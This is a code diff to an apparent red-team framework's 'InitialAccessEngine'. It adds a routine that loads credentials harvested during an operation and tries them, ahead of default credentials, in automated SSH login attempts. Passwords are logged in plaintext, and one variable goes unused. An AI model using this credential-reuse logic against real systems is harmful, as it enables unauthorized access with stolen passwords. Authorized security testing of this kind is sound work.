@@ -242,6 +242,42 @@ class InitialAccessEngine:
             error=None,
         )
 
+    async def _load_harvested_creds(
+        self,
+        db: aiosqlite.Connection,
+        operation_id: str,
+    ) -> list[tuple[str, str]]:
+        """Load credential facts already collected in this operation.
+
+        Returns a deduplicated list of (username, password) tuples, parsed from
+        facts with category='credential'.  Supported value formats:
+        - ``user:pass@host:port``  (written by ``_write_credential_fact``)
+        - ``user:pass``            (plaintext dump format)
+        """
+        db.row_factory = aiosqlite.Row
+        cursor = await db.execute(
+            "SELECT value FROM facts "
+            "WHERE operation_id = ? AND category = 'credential' "
+            "AND trait IN ('credential.ssh', 'credential.plaintext', 'credential.dumped') "
+            "ORDER BY score DESC, collected_at DESC",
+            (operation_id,),
+        )
+        rows = await cursor.fetchall()
+
+        seen: set[tuple[str, str]] = set()
+        creds: list[tuple[str, str]] = []
+        for row in rows:
+            val: str = row["value"]
+            # Strip @host:port suffix if present
+            user_pass = val.split("@")[0] if "@" in val else val
+            if ":" in user_pass:
+                u, p = user_pass.split(":", 1)
+                pair = (u.strip(), p.strip())
+                if pair not in seen:
+                    seen.add(pair)
+                    creds.append(pair)
+        return creds
+
     async def _real_ssh_login(
         self,
         db: aiosqlite.Connection,
@@ -253,7 +289,14 @@ class InitialAccessEngine:
         """Try each entry in ``_DEFAULT_CREDS`` via asyncssh."""
         import asyncssh  # deferred import
 
-        for username, password in _DEFAULT_CREDS:
+        # Prepend harvested credentials from this operation (highest priority)
+        harvested = await self._load_harvested_creds(db, operation_id)
+        all_creds = list({(u, p) for u, p in harvested + _DEFAULT_CREDS})
+        # Preserve order: harvested first, then default list (maintaining original order)
+        seen_in_harvested = set(harvested)
+        ordered_creds = harvested + [c for c in _DEFAULT_CREDS if c not in seen_in_harvested]
+
+        for username, password in ordered_creds:
             try:
                 logger.debug(
                     "Trying SSH %s@%s:%s with password %s",
